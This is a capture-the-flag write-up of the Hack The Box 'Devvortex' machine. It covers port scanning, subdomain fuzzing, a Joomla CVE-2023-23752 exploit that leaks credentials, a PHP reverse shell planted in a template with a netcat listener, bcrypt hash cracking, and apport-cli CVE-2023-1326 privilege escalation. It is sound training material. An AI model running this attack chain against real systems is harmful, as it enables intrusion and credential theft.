---
title: "Devvortex"
categories: [CTF, Hack The Box]
tags: [EASY, Linux, Joomla, Local File Include, CVE-2023-23752, apport-cli 2.26.0, CVE-2023-1326]
mermaid: true
image: ../assets/img/htb/devvortex/devvortex.png
---

The exploration of this machine began with scanning for open ports using nmap, identifying key services such as SSH and HTTP. A thorough enumeration revealed a Joomla installation vulnerable to CVE-2023-23752, allowing unauthorized information disclosure. Exploiting this vulnerability provided access to credentials, which were used to gain further access to the system. A reverse shell was uploaded, leading to initial access. Post-exploitation involved privilege escalation through a known vulnerability, CVE-2023-1326, ultimately granting root access.

# Overview

```mermaid
graph TD
    A[Inteligence Gathering]
    A --> B[Port Scan > Ports 22, 80]
    B --> C[Enumeration: HTTP > Joomla]
    C --> D[Exploitation > CVE-2023-23752, LFI]
    D --> E[Post-Exploitation: Privilege Escalation > Apport-Cli 2.26.0]
    E --> F[Root Shell Access]

```

## 1. Intelligence Gathering

### Port Scan

```bash
nmap -Pn -sS --top-ports=10 10.10.11.242
```

![Untitled](../assets/img/htb/devvortex/Untitled.png)

It seems there is no defense mechanism, so a scan will be conducted on all ports of the host.

```bash
nmap -Pn -p- 10.10.11.242
```

![Untitled](../assets/img/htb/devvortex/Untitled%201.png)

Service versions

```bash
nmap -Pn -sV -p80,22 10.10.11.242
```

Output

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

## 2. Enumeration

### **Port 22**

```bash
nc -nv 10.10.11.242 22
```

![Untitled](../assets/img/htb/devvortex/Untitled%202.png)

The banner matches the service version

### **PORT 80**

Checking the web application.

![Untitled](../assets/img/htb/devvortex/Untitled%203.png)

Main tools: Wappalyzer

![Untitled](../assets/img/htb/devvortex/Untitled%204.png)

> Nginx 1.18.0
> 

With netcat, it also returned the page code even without adding the domain.

```bash
nc -nv 10.10.11.242 80
GET / HTTP/1.0
```

![Untitled](../assets/img/htb/devvortex/Untitled%205.png)

Performing fuzzing of directories and files

```bash
gobuster dir -u http://devvortex.htb/ -w /usr/share/wordlists/dirb/big.txt  -t 50
```

![Untitled](../assets/img/htb/devvortex/Untitled%206.png)

Searching for subdomains.

```bash
gobuster dns -d devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

After finding [http://dev.devvortex.htb/](http://dev.devvortex.htb/), I added it to my /etc/hosts file to view what was available through the browser.

![Untitled](../assets/img/htb/devvortex/Untitled%207.png)

![Untitled](../assets/img/htb/devvortex/Untitled%208.png)

Fuzzing directories on the subdomain

```bash
feroxbuster -u http://dev.devvortex.htb/
```

![Untitled](../assets/img/htb/devvortex/Untitled%209.png)

I found the admin page

[http://dev.devvortex.htb/administrator/](http://dev.devvortex.htb/administrator/)

![Untitled](../assets/img/htb/devvortex/Untitled%2010.png)

I tried logging in with default credentials, but it didn't work.

Checking the robots.txt file

![Untitled](../assets/img/htb/devvortex/Untitled%2011.png)

## 3. Exploitation

Running Joomscan to find the version.

```bash
joomscan -u http://dev.devvortex/
```

![Untitled](../assets/img/htb/devvortex/Untitled%2012.png)

> Version: 4.2.6
> 

Searching for vulnerabilities related to the version.

![Untitled](../assets/img/htb/devvortex/Untitled%2013.png)

[GitHub - Acceis/exploit-CVE-2023-23752: Joomla! < 4.2.8 - Unauthenticated information disclosure](https://github.com/Acceis/exploit-CVE-2023-23752?source=post_page-----9cc1ad2961b5--------------------------------)

Reading the Wxploit requirements, it was necessary to install three Ruby gems (libraries) in a Ruby environment.

![Untitled](../assets/img/htb/devvortex/Untitled%2014.png)

Utilization of the exploit:

```bash
git clone https://github.com/Acceis/exploit-CVE-2023-23752.git
cd exploit-CVE-2023-23752
gem install httpx docopt paint
```

![Untitled](../assets/img/htb/devvortex/Untitled%2015.png)

Exploit

```bash
ruby exploit.rb [http://dev.devvortex.htb](http://dev.devvortex.htb/)
```

![Untitled](../assets/img/htb/devvortex/Untitled%2016.png)

```bash
User: lewis
Pass: P4ntherg0t1n5r3c0n##
Usuario do Banco
```

Login successful 

![Untitled](../assets/img/htb/devvortex/Untitled%2017.png)

In the templates, I will send a reverse shell.

![Untitled](../assets/img/htb/devvortex/Untitled%2018.png)

![Untitled](../assets/img/htb/devvortex/Untitled%2019.png)

I chose the file: `error_ful.php`

![Untitled](../assets/img/htb/devvortex/Untitled%2020.png)

The shell I sent was from Pentest Monkey with my information of socket

Fiquei escutando na porta 1234

```bash
rlwrap -cAr nc -vnlp 1234
```

![Untitled](../assets/img/htb/devvortex/Untitled%2021.png)

Location of the file: `templates/cassiopeia/error_full.php`

![Untitled](../assets/img/htb/devvortex/Untitled%2022.png)

Initial Access

![Untitled](../assets/img/htb/devvortex/Untitled%2023.png)

However, the user did not have any permissions

![Untitled](../assets/img/htb/devvortex/Untitled%2024.png)

I improved the shell with Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![Untitled](../assets/img/htb/devvortex/Untitled%2025.png)

Since the user had database access, let's access the database.

```bash
mysql -ulewis -pP4ntherg0t1n5r3c0n##
```

![Untitled](../assets/img/htb/devvortex/Untitled%2026.png)

```sql
show databases;
use joomla
show tables;
SELECT * FROM sd4fg_users;
```

![Untitled](../assets/img/htb/devvortex/Untitled%2027.png)

The hash of the user with permissions was captured.

![Untitled](../assets/img/htb/devvortex/Untitled%2028.png)

![Untitled](../assets/img/htb/devvortex/Untitled%2029.png)

```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

![Untitled](../assets/img/htb/devvortex/Untitled%2030.png)

Crack 

```bash
nano hash
john --format=bcrypt hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![Untitled](../assets/img/htb/devvortex/Untitled%2031.png)

> User: logon | Pass: tequieromucho
> 

SSH access:

![Untitled](../assets/img/htb/devvortex/Untitled%2032.png)

```bash
sh -oHostKeyAlgorithms=+ssh-dss logan@10.10.11.242
```

The `-oHostKeyAlgorithms=+ssh-dss` parameter you added to the SSH command specifies the use of the DSA (ssh-dss) host key algorithm. This parameter might be necessary when you encounter connection issues due to differences in the SSH client and server versions or specific cryptographic configurations.

![image.png](../assets/img/htb/devvortex/image.png)

## 4. Post-Exploitation

### Privilege Escalation

Sudo Misconfiguration

```bash
sudo -l
```

![Untitled](../assets/img/htb/devvortex/Untitled%2033.png)

I couldn't find it on GTFOBins, so I searched on Google

[https://github.com/diego-tella/CVE-2023-1326-PoC](https://github.com/diego-tella/CVE-2023-1326-PoC)

![Untitled](../assets/img/htb/devvortex/Untitled%2034.png)

I pressed options 1 and 2, then hit enter to call the bash with `!/bin/bash`

![Untitled](../assets/img/htb/devvortex/Untitled%2035.png)